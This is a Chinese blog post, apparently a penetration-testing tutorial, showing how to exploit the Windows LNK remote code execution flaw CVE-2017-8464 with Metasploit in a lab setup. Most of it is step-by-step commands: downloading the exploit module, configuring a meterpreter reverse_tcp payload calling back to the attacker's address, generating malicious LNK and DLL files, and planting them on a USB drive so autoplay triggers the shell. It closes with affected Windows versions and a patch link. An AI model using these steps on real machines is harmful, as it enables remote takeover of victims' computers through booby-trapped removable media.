# msf 下的 LNK 漏洞（CVE-2017-8464）利用 - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/7243636.html`](https://www.cnblogs.com/backlion/p/7243636.html)

### 0x01 前言

RCE 漏洞存在于 Windows 处理 LNK 文件的环节。攻击者利用漏洞可以获得与本地用户相同的用户权限。被使用此漏洞攻击时，用户权限较少的账户相较管理员权限的用户受到的影响更小。

攻击者可以给受害者一个恶意的 LNK 文件和关联的恶意二进制，文件可以存放在可移动磁盘或远程共享中。当用户用 Windows 资源管理器或任何其他能够解析 LNK 文件的软件，打开此驱动器 （或远程共享） 时，恶意文件就会在目标系统上执行攻击者的代码。

### 0x02 漏洞环境搭建与利用

**漏洞环境搭建：**

kalix86   192.168.1.109  攻击机

windows7x64  192.168.1.101  目标靶机

**漏洞利用：**

1.kali 主机下载 cve_2017_8464_lnk_rce.rb：

```
cd  /opt
wget  https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb
```

![](img/516e459277a90f4ebff40a33f33ff521.png)

2.将 cve_2017_8464_lnk_rce.rb 拷贝到

/usr/share/metasploit-framework/modules/exploit/windows/smb/目录下：

```
cp  cve_2017_8464_lnk_rce.rb  /usr/share/metasploit-framework/modules/exploits/windows/smb/
```

 ![](img/416f4f9642f50a64ba5fbde09bf69990.png)

3.生成监听 shell:

```
msf > use exploit/multi/handler

msf  exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

msf exploit(handler) > set LHOST 192.168.1.109

msf exploit(handler) > exploit -j
```

 ![](img/aee5141e329151a3fdde73062b3d1d7d.png)

4 生成大量的.LNK 文件（对应盘符从 D 盘到 Z 盘）和要加载的.dll 文件（后门文件, copy 了一个 lnk 文件（根据插入靶机 U 盘后识别的盘符，例如我插入 U 盘后显示的 E 盘，所以就选择了 E 结尾的 lnk 文件）和 dll 文件到 U 盘)

```
msf exploit(handler) > back

msf > use exploit/windows/smb/cve_2017_8464_lnk_rce

msf exploit(cve_2017_8464_lnk_rce) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

msf exploit(cve_2017_8464_lnk_rce) > set LHOST 192.168.1.109

msf exploit(cve_2017_8464_lnk_rce) > exploit
```

 ![](img/c8177f9b55c5746c261ca61056af3966.png)

5.将/root/.msf4/local/*所有文件拷贝到/opt 目录下的 test 文件夹中，然后拷贝到目标靶机 windows7X64 上

```
root@backlion:~# cd /opt

root@backlion:/opt# mkdir test

root@backlion:/opt# cp  /root/.msf4/local/*   test/

root@backlion:/opt# cd  test/

root@backlion:/opt/test# ls
```

 ![](img/e337bfd0c597dbcc86a92cab2087efd8.png)

拷贝的本机 win7x64 上：

 ![](img/dc82d5e9c7a8c71e848d1ab59d89d6b6.png)

6.然后点击快捷键，就会触发注册 dll 文件，如果不行直接注册 dll 文件（一般是将这项快捷键和 DLL 文件拷贝到一个文件夹里面然后拷贝到 U 盘，只要对方开了 U 盘自动启动播放功能，就会自动触发注册 dll 文件）

 ![](img/5e8ce81b6edc96ac8b03b056b933e64b.png)

7.在 kali 下可以看到成功获得 sesions 会话为 1

```
sessions  -i 1
```

 ![](img/883b158043b29bd30802572e2c9d2caf.png)

8.然后进入到会话，就会成功进入到 metermter 的 shell 界面：

 ![](img/628d782653775bb1cd9d3f54ea46221c.png)

### 0x03 漏洞影响与修复

**漏洞影响：**

Windows 10

Windows 7

Windows 8.1

Windows RT 8.1

Windows Server 2008

Windows Server 2008 R2

Windows Server 2012

Windows Server 2012 R2

Windows Server 2016

**漏洞修复：**

下载补丁，其地址为：

https://support.microsoft.com/zh-cn/help/4025686/microsoft-security-advisory-4025685-guidance-for-supported-platforms